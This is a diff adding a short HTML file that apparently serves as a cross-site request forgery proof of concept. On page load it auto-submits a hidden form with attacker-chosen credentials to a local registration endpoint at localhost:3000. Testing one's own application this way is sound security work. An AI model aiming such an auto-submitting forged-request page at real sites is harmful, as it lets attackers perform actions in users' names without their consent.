@@ -1,0 +1,10 @@
+<html>
+<body>
+  <form action="http://localhost:3000/api/auth/register" method="POST">
+    <input type="hidden" name="username" value="csrf_hacker">
+    <input type="hidden" name="email" value="csrf@hacker.com">
+    <input type="hidden" name="password" value="Hack1234">
+  </form>
+  <script>document.forms[0].submit();</script>
+</body>
+</html>
